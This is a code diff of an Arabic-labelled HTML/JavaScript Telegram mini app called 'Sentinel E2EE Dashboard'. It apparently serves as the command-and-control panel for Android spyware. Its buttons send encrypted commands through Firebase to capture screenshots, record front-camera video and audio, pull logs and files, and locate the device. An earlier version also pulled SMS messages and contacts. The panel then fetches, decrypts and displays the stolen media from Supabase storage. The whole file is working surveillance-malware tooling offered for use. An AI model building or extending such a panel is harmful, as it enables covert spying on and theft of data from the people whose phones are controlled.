@@ -3,19 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sentinel Mini App</title>
-    <!-- استدعاء Tailwind CSS لسرعة وجمالية التصميم -->
+    <title>Sentinel E2EE Dashboard</title>
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- مكتبة التشفير -->
+    <!-- CryptoJS -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <!-- مكتبة تليجرام ويب آب -->
+    <!-- Telegram Web App -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
-        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        .glass-panel { background: rgba(22, 27, 34, 0.8); backdrop-filter: blur(10px); border: 1px solid #30363d; }
-        .btn-action { transition: all 0.2s ease-in-out; }
+        body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow-x: hidden; }
+        .glass-panel { background: rgba(22, 27, 34, 0.85); backdrop-filter: blur(12px); border: 1px solid #30363d; }
+        .btn-action { transition: transform 0.1s; }
         .btn-action:active { transform: scale(0.95); }
+        .media-container video, .media-container img, .media-container audio { max-width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid #30363d; }
+        .terminal { background: #000; color: #0f0; font-family: monospace; padding: 10px; border-radius: 8px; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; max-height: 200px; overflow-y: auto; text-align: left; direction: ltr;}
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center p-4">
@@ -26,157 +28,189 @@
         <button onclick="openSettings()" class="text-gray-400 hover:text-white">⚙️ إعدادات</button>
     </div>
 
-    <!-- Main Grid -->
-    <div class="w-full max-w-md grid grid-cols-2 gap-4 mb-6">
-        <button onclick="sendCommand('/screen')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
-            <span class="text-2xl mb-2">📸</span>
-            <span class="text-sm font-semibold">لقطة شاشة</span>
+    <!-- Live Media & Terminal Output -->
+    <div id="outputContainer" class="w-full max-w-md glass-panel rounded-xl p-4 mb-6 hidden">
+        <div class="flex justify-between items-center mb-2 border-b border-gray-700 pb-2">
+            <h2 class="text-sm font-bold text-blue-400">📡 وحدة المراقبة والاستقبال</h2>
+            <button onclick="clearOutput()" class="text-red-400 text-xs hover:text-red-300">مسح النافذة</button>
+        </div>
+        <div id="mediaBox" class="media-container w-full flex flex-col items-center"></div>
+        <div id="terminalBox" class="terminal hidden w-full mt-2"></div>
+    </div>
+
+    <!-- Control Grid -->
+    <div class="w-full max-w-md grid grid-cols-2 gap-3 mb-6">
+        <button onclick="sendCommand('/screen')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center hover:bg-gray-800">
+            <span class="text-2xl mb-1">📸</span><span class="text-xs font-semibold">لقطة شاشة</span>
         </button>
-        <button onclick="sendCommand('/location')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
-            <span class="text-2xl mb-2">📍</span>
-            <span class="text-sm font-semibold">الموقع</span>
+        <button onclick="sendCommand('/video front 10')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center hover:bg-gray-800">
+            <span class="text-2xl mb-1">🎥</span><span class="text-xs font-semibold">فيديو (10ث)</span>
         </button>
-        <button onclick="sendCommand('/live')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
-            <span class="text-2xl mb-2">📱</span>
-            <span class="text-sm font-semibold">بث الشاشة</span>
+        <button onclick="sendCommand('/audio 10')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center hover:bg-gray-800">
+            <span class="text-2xl mb-1">🎙️</span><span class="text-xs font-semibold">تسجيل صوت</span>
         </button>
-        <button onclick="sendCommand('/livecam front')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
-            <span class="text-2xl mb-2">🔴</span>
-            <span class="text-sm font-semibold">بث كاميرا أمامية</span>
+        <button onclick="sendCommand('/getlogs')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center hover:bg-gray-800">
+            <span class="text-2xl mb-1">📋</span><span class="text-xs font-semibold">سحب السجلات</span>
         </button>
-        <button onclick="sendCommand('/sms')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
-            <span class="text-2xl mb-2">💬</span>
-            <span class="text-sm font-semibold">سحب الرسائل</span>
+        <button onclick="sendCommand('/files')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center hover:bg-gray-800">
+            <span class="text-2xl mb-1">📂</span><span class="text-xs font-semibold">استكشاف الملفات</span>
         </button>
-        <button onclick="sendCommand('/contacts')" class="btn-action glass-panel rounded-xl p-4 flex flex-col items-center justify-center text-center">
-            <span class="text-2xl mb-2">👥</span>
-            <span class="text-sm font-semibold">سحب جهات الاتصال</span>
+        <button onclick="sendCommand('/location')" class="btn-action glass-panel rounded-xl p-3 flex flex-col items-center justify-center text-center hover:bg-gray-800">
+            <span class="text-2xl mb-1">📍</span><span class="text-xs font-semibold">تحديد الموقع</span>
         </button>
     </div>
 
     <!-- Custom Command Input -->
     <div class="w-full max-w-md glass-panel rounded-xl p-4 flex gap-2">
-        <input type="text" id="customCmd" placeholder="أدخل أمراً مخصصاً (مثال: /info)" class="flex-1 bg-transparent border border-gray-600 rounded px-3 py-2 text-white focus:outline-none focus:border-green-400">
-        <button onclick="sendCustomCommand()" class="bg-green-600 hover:bg-green-500 text-white font-bold py-2 px-4 rounded btn-action">إرسال</button>
+        <input type="text" id="customCmd" placeholder="مثال: /dl /sdcard/Download/test.mp4" class="flex-1 bg-transparent border border-gray-600 rounded px-3 py-2 text-white text-sm focus:outline-none focus:border-green-400">
+        <button onclick="sendCustomCommand()" class="bg-blue-600 hover:bg-blue-500 text-white text-sm font-bold py-2 px-4 rounded btn-action">إرسال</button>
     </div>
 
-    <!-- Settings Modal (Hidden by default) -->
-    <div id="settingsModal" class="fixed inset-0 bg-black bg-opacity-80 flex justify-center items-center hidden z-50 p-4">
-        <div class="glass-panel w-full max-w-md rounded-xl p-6 shadow-2xl">
-            <h2 class="text-lg font-bold mb-4 text-white">⚙️ إعدادات التشفير والاتصال</h2>
-            <div class="mb-4">
-                <label class="block text-sm text-gray-400 mb-1">مفتاح التشفير (AES Key)</label>
-                <input type="text" id="aesKey" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white focus:outline-none focus:border-blue-400">
+    <!-- Media Player Modal (In-Memory Display) -->
+    <div id="mediaModal" class="fixed inset-0 bg-black bg-opacity-95 flex flex-col justify-center items-center hidden z-50 p-4">
+        <div class="w-full max-w-lg flex justify-between items-center mb-4">
+            <h2 class="text-white font-bold text-lg">👁️ عارض النتائج الآمن</h2>
+            <button onclick="closeMediaPlayer()" class="text-red-500 font-bold text-xl hover:text-red-400">✖</button>
+        </div>
+        <div id="mediaContainer" class="w-full max-w-lg flex justify-center items-center bg-[#0d1117] rounded-lg border border-gray-700 p-2 min-h-[250px] overflow-auto">
+            <!-- سيتم حقن الميديا هنا برمجياً -->
+        </div>
+        <div class="mt-6 flex gap-4">
+            <a id="downloadBtn" style="display:none;" class="bg-blue-600 hover:bg-blue-500 text-white font-bold py-2 px-6 rounded shadow-lg text-sm">⬇️ حفظ الملف محلياً</a>
+        </div>
+    </div>
+
+    <!-- Settings Modal -->
+    <div id="settingsModal" class="fixed inset-0 bg-black bg-opacity-90 flex justify-center items-center hidden z-50 p-4">
+        <div class="glass-panel w-full max-w-md rounded-xl p-5 shadow-2xl overflow-y-auto max-h-[90vh]">
+            <h2 class="text-lg font-bold mb-4 text-white">⚙️ إعدادات التشفير والسحابة</h2>
+            
+            <div class="mb-3">
+                <label class="block text-xs text-gray-400 mb-1">مفتاح التشفير (AES Key)</label>
+                <input type="text" id="aesKey" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm">
             </div>
-            <div class="mb-4">
-                <label class="block text-sm text-gray-400 mb-1">وضع الاتصال</label>
-                <select id="connMode" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white focus:outline-none">
-                    <option value="telegram">Telegram WebApp (توصية)</option>
-                    <option value="firebase">Firebase REST API</option>
-                </select>
+            
+            <h3 class="text-sm font-bold mt-4 mb-2 text-blue-400">🔥 إعدادات Firebase (للتحكم الحي)</h3>
+            <div class="mb-3">
+                <label class="block text-xs text-gray-400 mb-1">رابط قاعدة البيانات (URL)</label>
+                <input type="text" id="fbUrl" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm" placeholder="https://xxx.firebaseio.com">
             </div>
-            <!-- إعدادات فايربيز تظهر فقط إذا تم اختياره -->
-            <div id="fbSettings" class="hidden">
-                <div class="mb-4">
-                    <label class="block text-sm text-gray-400 mb-1">رابط قاعدة البيانات (Firebase URL)</label>
-                    <input type="text" id="fbUrl" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white placeholder-gray-600" placeholder="https://your-app.firebaseio.com">
-                </div>
-                <div class="mb-4">
-                    <label class="block text-sm text-gray-400 mb-1">الرقم السري لقاعدة البيانات (Database Secret)</label>
-                    <input type="text" id="fbSecret" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white">
-                </div>
+            <div class="mb-3">
+                <label class="block text-xs text-gray-400 mb-1">رقم سري فايربيز (Secret)</label>
+                <input type="text" id="fbSecret" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm">
             </div>
-            <div class="flex justify-end gap-2 mt-6">
-                <button onclick="closeSettings()" class="px-4 py-2 rounded border border-gray-600 hover:bg-gray-800 transition">إلغاء</button>
-                <button onclick="saveSettings()" class="px-4 py-2 rounded bg-blue-600 hover:bg-blue-500 text-white font-bold transition">حفظ</button>
+
+            <h3 class="text-sm font-bold mt-4 mb-2 text-green-400">☁️ إعدادات Supabase (لسحب الملفات)</h3>
+            <div class="mb-3">
+                <label class="block text-xs text-gray-400 mb-1">رابط Supabase</label>
+                <input type="text" id="supaUrl" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm" placeholder="https://xxx.supabase.co">
+            </div>
+            <div class="mb-3">
+                <label class="block text-xs text-gray-400 mb-1">مفتاح API (anon/service key)</label>
+                <input type="text" id="supaKey" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm">
+            </div>
+            <div class="mb-3">
+                <label class="block text-xs text-gray-400 mb-1">اسم الباكيت (Bucket Name)</label>
+                <input type="text" id="supaBucket" value="pg-files" class="w-full bg-[#0d1117] border border-gray-600 rounded px-3 py-2 text-white text-sm">
+            </div>
+
+            <div class="flex items-center mt-5 mb-2">
+                <input type="checkbox" id="autoDownload" class="w-4 h-4 text-blue-600 bg-gray-800 border-gray-600 rounded">
+                <label class="ml-2 mr-2 text-sm font-medium text-gray-300">تنزيل الملفات تلقائياً (Auto-Save)</label>
+            </div>
+            
+            <div class="flex justify-end gap-2 mt-5">
+                <button onclick="closeSettings()" class="px-4 py-2 rounded text-sm border border-gray-600 hover:bg-gray-800 text-white">إلغاء</button>
+                <button onclick="saveSettings()" class="px-4 py-2 rounded text-sm bg-blue-700 hover:bg-blue-600 text-white font-bold">حفظ واتصال</button>
             </div>
         </div>
     </div>
 
-    <!-- Notification Toast -->
-    <div id="toast" class="fixed bottom-10 bg-green-600 text-white px-6 py-2 rounded-full shadow-lg opacity-0 transition-opacity duration-300 pointer-events-none">
-        تم الإرسال بنجاح
-    </div>
+    <!-- Toast Notification -->
+    <div id="toast" class="fixed bottom-10 bg-gray-800 border border-gray-600 text-white px-6 py-2 rounded-full shadow-lg opacity-0 transition-opacity duration-300 pointer-events-none text-sm z-50"></div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        tg.expand(); // توسيع الواجهة في تليجرام
+        tg.expand();
 
-        // التحكم في ظهور وإخفاء حقول فايربيز بناء على الوضع
-        document.getElementById('connMode').addEventListener('change', function(e) {
-            document.getElementById('fbSettings').style.display = e.target.value === 'firebase' ? 'block' : 'none';
-        });
+        let listenerInterval = null;
+        let lastResponseTime = 0;
+        let currentBlobUrl = null; // الاحتفاظ برابط الذاكرة لتدميره لاحقاً
 
-        // دالة التشفير المطابقة للأندرويد (AES/CBC/PKCS5Padding)
-        function encryptAES(plainText, secretKeyStr) {
+        // دالة تشفير النصوص (لإرسال الأوامر)
+        function encryptText(plainText, secretKeyStr) {
             try {
                 const key = CryptoJS.enc.Utf8.parse(secretKeyStr);
                 const iv = CryptoJS.lib.WordArray.random(16);
-                const encrypted = CryptoJS.AES.encrypt(plainText, key, {
-                    iv: iv,
-                    mode: CryptoJS.mode.CBC,
-                    padding: CryptoJS.pad.Pkcs7
-                });
-                const combined = iv.clone().concat(encrypted.ciphertext);
-                return CryptoJS.enc.Base64.stringify(combined);
-            } catch (error) {
-                alert("خطأ في التشفير: تأكد من أن مفتاح التشفير صحيح.");
-                return null;
-            }
+                const encrypted = CryptoJS.AES.encrypt(plainText, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
+                return CryptoJS.enc.Base64.stringify(iv.clone().concat(encrypted.ciphertext));
+            } catch (error) { return null; }
         }
 
-        // إرسال الأمر
+        // دالة فك تشفير النصوص (للردود النصية)
+        function decryptText(encryptedBase64, secretKeyStr) {
+            try {
+                const key = CryptoJS.enc.Utf8.parse(secretKeyStr);
+                const encryptedBytes = CryptoJS.enc.Base64.parse(encryptedBase64);
+                const iv = CryptoJS.lib.WordArray.create(encryptedBytes.words.slice(0, 4));
+                const ciphertext = CryptoJS.lib.WordArray.create(encryptedBytes.words.slice(4), encryptedBytes.sigBytes - 16);
+                const decrypted = CryptoJS.AES.decrypt({ ciphertext: ciphertext }, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.Pkcs7 });
+                return decrypted.toString(CryptoJS.enc.Utf8);
+            } catch (error) { return "ERROR_DECRYPT"; }
+        }
+
+        // دالة فك التشفير العتادية (سريعة جداً للملفات الكبيرة كالفيديو) تمنع التشنج
+        async function decryptFileBuffer(encryptedArrayBuffer, secretKeyStr) {
+            // تحضير المفتاح ليكون 32 بايت (AES-256)
+            const keyBuffer = new TextEncoder().encode(secretKeyStr.padEnd(32, '\0').substring(0,32));
+            const cryptoKey = await window.crypto.subtle.importKey(
+                "raw", keyBuffer, { name: "AES-CBC" }, false, ["decrypt"]
+            );
+            
+            // قراءة الـ IV من أول 16 بايت من الملف المشفر
+            const iv = encryptedArrayBuffer.slice(0, 16);
+            const ciphertext = encryptedArrayBuffer.slice(16);
+            
+            // فك التشفير عتادياً داخل الـ RAM
+            const decryptedBuffer = await window.crypto.subtle.decrypt(
+                { name: "AES-CBC", iv: new Uint8Array(iv) },
+                cryptoKey,
+                ciphertext
+            );
+            return decryptedBuffer;
+        }
+
+        // إرسال أمر حصرياً عبر فايربيز
         function sendCommand(cmd) {
             const aesKey = localStorage.getItem('aesKey');
-            const mode = localStorage.getItem('connMode') || 'telegram';
+            const fbUrl = localStorage.getItem('fbUrl');
+            const fbSecret = localStorage.getItem('fbSecret');
 
-            if (!aesKey) {
+            if (!aesKey || !fbUrl || !fbSecret) {
                 openSettings();
                 return;
             }
 
-            const encryptedData = encryptAES(cmd, aesKey);
+            const encryptedData = encryptText(cmd, aesKey);
             if (!encryptedData) return;
 
-            if (mode === 'telegram') {
-                // الطريقة الأولى المستقلة (عبر تليجرام)
-                tg.sendData(encryptedData);
-                showToast("تم إرسال الأمر المشفر عبر Telegram");
-                setTimeout(() => tg.close(), 500); // إغلاق الواجهة بعد الإرسال
-            } else {
-                // الطريقة الثانية (عبر فايربيز)
-                const fbUrl = localStorage.getItem('fbUrl');
-                const fbSecret = localStorage.getItem('fbSecret');
-                if (!fbUrl || !fbSecret) {
-                    alert("إعدادات فايربيز مفقودة.");
-                    openSettings();
-                    return;
+            // توجيه الرد حصرياً إلى فايربيز لكي نصطاده هنا
+            const payload = { cmd: encryptedData, status: "pending", reply_to: "PYTHON_FIREBASE" };
+
+            fetch(`${fbUrl}/current_command.json?auth=${fbSecret}`, {
+                method: 'PUT',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(res => {
+                if(res.ok) {
+                    showToast(`تم الإرسال: ${cmd}`);
                 }
-
-                const payload = {
-                    cmd: encryptedData,
-                    status: "pending",
-                    reply_to: "TELEGRAM"
-                };
-
-                const fullUrl = `${fbUrl}/current_command.json?auth=${fbSecret}`;
-                fetch(fullUrl, {
-                    method: 'PUT',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).then(res => {
-                    if(res.ok) {
-                        showToast("تم إرسال الأمر المشفر للسحابة (Firebase)");
-                    } else {
-                        alert("فشل الإرسال للسحابة.");
-                    }
-                }).catch(err => alert("خطأ في الاتصال: " + err));
-            }
+            }).catch(err => showToast("خطأ شبكة أثناء الإرسال"));
         }
 
         function sendCustomCommand() {
             const cmd = document.getElementById('customCmd').value;
-            if(cmd.trim() !== '') sendCommand(cmd);
+            if(cmd.trim() !== '') { sendCommand(cmd); document.getElementById('customCmd').value = ''; }
         }
 
         function showToast(msg) {
@@ -187,15 +221,183 @@
             setTimeout(() => {
                 toast.classList.remove('opacity-100');
                 toast.classList.add('opacity-0');
-            }, 2500);
+            }, 3000);
         }
 
+        function clearOutput() {
+            document.getElementById('outputContainer').classList.add('hidden');
+            document.getElementById('mediaBox').innerHTML = '';
+            document.getElementById('terminalBox').innerText = '';
+            document.getElementById('terminalBox').classList.add('hidden');
+        }
+
+        // تحديد نوع الملف لصناعة الـ Blob
+        function getMimeType(filename) {
+            const ext = filename.split('.').pop().toLowerCase();
+            if(['mp4'].includes(ext)) return 'video/mp4';
+            if(['jpg', 'jpeg', 'png'].includes(ext)) return 'image/jpeg';
+            if(['m4a', 'mp3'].includes(ext)) return 'audio/mp4';
+            if(['txt', 'log'].includes(ext)) return 'text/plain';
+            return 'application/octet-stream';
+        }
+
+        // تحميل الملف المشفر من Supabase وفك تشفيره في الذاكرة
+        async function fetchAndDecryptBinary(fileName) {
+            const supaUrl = localStorage.getItem('supaUrl');
+            const supaBucket = localStorage.getItem('supaBucket');
+            const aesKey = localStorage.getItem('aesKey');
+
+            if(!supaUrl || !supaBucket) {
+                showToast("إعدادات Supabase مفقودة، لا يمكن جلب الملف.");
+                return;
+            }
+
+            document.getElementById('outputContainer').classList.remove('hidden');
+            const mediaBox = document.getElementById('mediaBox');
+            mediaBox.innerHTML = `<p class="text-yellow-400 text-xs animate-pulse">⏳ جاري تحميل وفك تشفير البيانات الثنائية بأمان...<br>${fileName}</p>`;
+
+            try {
+                // 1. تحميل الملف المشفر
+                const fileUrl = `${supaUrl}/storage/v1/object/public/${supaBucket}/${fileName}`;
+                const response = await fetch(fileUrl);
+                if (!response.ok) throw new Error("فشل تحميل الملف من السحابة");
+                
+                const encryptedBuffer = await response.arrayBuffer();
+
+                // 2. فك التشفير السريع (RAM-Only Isolation)
+                const decryptedBuffer = await decryptFileBuffer(encryptedBuffer, aesKey);
+                
+                // 3. استخراج الاسم الأصلي وتحديد النوع
+                let originalName = fileName.replace(/\.enc$/, ''); // إزالة .enc
+                originalName = originalName.replace(/_[0-9a-fA-F]{16,}\./, '.'); // تنظيف الهاش
+                const mimeType = getMimeType(originalName);
+
+                // 4. إنشاء Blob آمن
+                const blob = new Blob([decryptedBuffer], { type: mimeType });
+                
+                showToast(`✅ تم فك التشفير بأمان في الذاكرة العشوائية.`);
+                renderMedia(blob, mimeType, originalName);
+
+            } catch(e) {
+                mediaBox.innerHTML = `<p class="text-red-500 text-xs">❌ فشل المعالجة: ${e.message}</p>`;
+            }
+        }
+
+        // العرض الآمن في الواجهة والحفظ المحلي
+        function renderMedia(blob, mimeType, fileName) {
+            const container = document.getElementById('mediaContainer');
+            const downloadBtn = document.getElementById('downloadBtn');
+            const modal = document.getElementById('mediaModal');
+            
+            container.innerHTML = ''; 
+            
+            // تدمير الرابط السابق من الذاكرة لضمان الأمان
+            if(currentBlobUrl) URL.revokeObjectURL(currentBlobUrl);
+            
+            currentBlobUrl = URL.createObjectURL(blob);
+
+            // بناء العارض المناسب
+            if (mimeType.startsWith('image/')) {
+                container.innerHTML = `<img src="${currentBlobUrl}" class="max-w-full max-h-[70vh] object-contain rounded">`;
+            } else if (mimeType.startsWith('video/')) {
+                container.innerHTML = `<video src="${currentBlobUrl}" controls autoplay class="max-w-full max-h-[70vh] rounded"></video>`;
+            } else if (mimeType.startsWith('audio/')) {
+                container.innerHTML = `<audio src="${currentBlobUrl}" controls autoplay class="w-full mt-10"></audio>`;
+            } else if (mimeType.startsWith('text/')) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    container.innerHTML = `<pre class="w-full h-[60vh] overflow-auto text-xs text-green-400 p-2 text-left bg-black rounded" dir="ltr">${e.target.result.replace(/</g, '&lt;')}</pre>`;
+                };
+                reader.readAsText(blob);
+            } else {
+                container.innerHTML = `<div class="text-gray-400 text-sm">ملف غير مدعوم للعرض المباشر. يرجى حفظه.</div>`;
+            }
+
+            // إعداد زر التحميل
+            downloadBtn.href = currentBlobUrl;
+            downloadBtn.download = fileName;
+            downloadBtn.style.display = 'block';
+            downloadBtn.innerText = `⬇️ حفظ (${fileName})`;
+
+            modal.classList.remove('hidden');
+
+            // التنزيل التلقائي إذا كان الخيار مفعلاً
+            if(localStorage.getItem('autoDownload') === 'true') {
+                const a = document.createElement('a');
+                a.href = currentBlobUrl;
+                a.download = fileName;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                showToast(`تم تنزيل ${fileName} لتنزيلات جهازك.`);
+            }
+        }
+
+        function closeMediaPlayer() {
+            document.getElementById('mediaModal').classList.add('hidden');
+            document.getElementById('mediaContainer').innerHTML = '';
+            
+            // 🔥 أهم خطوة أمنية: مسح الملف من الـ RAM نهائياً بمجرد إغلاق النافذة
+            if(currentBlobUrl) {
+                URL.revokeObjectURL(currentBlobUrl);
+                currentBlobUrl = null;
+            }
+            document.getElementById('mediaBox').innerHTML = `<p class="text-green-500 text-xs">تم مسح الملف من الذاكرة بأمان 🧹</p>`;
+        }
+
+        // الاستماع المستمر لفايربيز
+        function startFirebaseListener() {
+            const fbUrl = localStorage.getItem('fbUrl');
+            const fbSecret = localStorage.getItem('fbSecret');
+            const aesKey = localStorage.getItem('aesKey');
+
+            if (!fbUrl || !fbSecret || !aesKey) return;
+
+            if(listenerInterval) clearInterval(listenerInterval);
+
+            listenerInterval = setInterval(() => {
+                fetch(`${fbUrl}/responses.json?auth=${fbSecret}&orderBy="timestamp"&limitToLast=1`)
+                .then(res => res.json())
+                .then(data => {
+                    if(!data) return;
+                    const key = Object.keys(data)[0];
+                    const record = data[key];
+
+                    if (record.timestamp > lastResponseTime) {
+                        lastResponseTime = record.timestamp;
+                        const decryptedText = decryptText(record.data, aesKey);
+                        
+                        if (decryptedText !== "ERROR_DECRYPT") {
+                            // هل الرد عبارة عن إشعار بوجود ملف في السحابة؟
+                            if (decryptedText.includes("FILE EXISTS ON CLOUD:")) {
+                                const fileNameMatch = decryptedText.match(/`(.*?)`/);
+                                if (fileNameMatch && fileNameMatch[1]) {
+                                    fetchAndDecryptBinary(fileNameMatch[1]);
+                                }
+                            } else {
+                                // عرض الرد النصي العادي في الـ Terminal
+                                document.getElementById('outputContainer').classList.remove('hidden');
+                                document.getElementById('mediaBox').innerHTML = '';
+                                const term = document.getElementById('terminalBox');
+                                term.classList.remove('hidden');
+                                term.innerText = decryptedText;
+                                term.scrollTop = term.scrollHeight;
+                            }
+                        }
+                    }
+                }).catch(e => {});
+            }, 2000);
+        }
+
+        // إعدادات الواجهة
         function openSettings() {
             document.getElementById('aesKey').value = localStorage.getItem('aesKey') || '';
-            document.getElementById('connMode').value = localStorage.getItem('connMode') || 'telegram';
             document.getElementById('fbUrl').value = localStorage.getItem('fbUrl') || '';
             document.getElementById('fbSecret').value = localStorage.getItem('fbSecret') || '';
-            document.getElementById('connMode').dispatchEvent(new Event('change'));
+            document.getElementById('supaUrl').value = localStorage.getItem('supaUrl') || '';
+            document.getElementById('supaKey').value = localStorage.getItem('supaKey') || '';
+            document.getElementById('supaBucket').value = localStorage.getItem('supaBucket') || 'pg-files';
+            document.getElementById('autoDownload').checked = localStorage.getItem('autoDownload') === 'true';
             document.getElementById('settingsModal').classList.remove('hidden');
         }
 
@@ -205,16 +407,23 @@
 
         function saveSettings() {
             localStorage.setItem('aesKey', document.getElementById('aesKey').value);
-            localStorage.setItem('connMode', document.getElementById('connMode').value);
             localStorage.setItem('fbUrl', document.getElementById('fbUrl').value);
             localStorage.setItem('fbSecret', document.getElementById('fbSecret').value);
+            localStorage.setItem('supaUrl', document.getElementById('supaUrl').value);
+            localStorage.setItem('supaKey', document.getElementById('supaKey').value);
+            localStorage.setItem('supaBucket', document.getElementById('supaBucket').value);
+            localStorage.setItem('autoDownload', document.getElementById('autoDownload').checked);
+            
             closeSettings();
-            showToast("تم حفظ الإعدادات بأمان محلياً");
+            showToast("تم حفظ الإعدادات بنجاح");
+            startFirebaseListener();
         }
 
-        // إجبار المستخدم على إدخال الإعدادات أول مرة
+        // بدء التشغيل
         if (!localStorage.getItem('aesKey')) {
             openSettings();
+        } else {
+            startFirebaseListener();
         }
     </script>
 </body>
